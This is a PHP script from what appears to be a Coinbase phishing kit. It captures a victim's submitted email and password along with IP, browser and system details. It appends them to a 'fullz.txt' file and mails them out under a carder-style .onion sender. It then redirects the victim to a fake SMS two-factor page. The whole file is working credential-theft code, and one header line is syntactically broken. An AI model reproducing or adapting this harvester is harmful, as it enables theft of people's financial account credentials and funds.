<?php
$ip = getenv("REMOTE_ADDR");
require '../CONFIG/Your-Email.php';

require '../function/get_browser.php';
$message .= "+----------------------[ Account Info ]----------------------+\n";
$message .= "UserID              : ".$_POST['email']."\n";
$message .= "PassCode            : ".$_POST['password']."\n";
$message .= "+----------------------[ IP Info ]----------------------+\n";
$message .= "IP Address          : ".$ip."\n";
$message .= "Browser             : ".$browser."\n";
$message .= "System              : ".$os."\n";
$message .= "User Agnet          : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "+----------------------[ Thank You ]----------------------+\n";
$cc = $_POST['ccn'];
$subject = "💟 Coinbase Access: ".$_POST['email']." [ $os - $browser - $ip ] ";
$headers = 'From: ArtCode <carder@art-code.onion>' . "\r\n" .
$file = fopen("../fullz.txt", 'a');
fwrite($file, $message);
mail($send,$subject,$message,$headers);

header("Location: ../two-factor/sms.php");?>
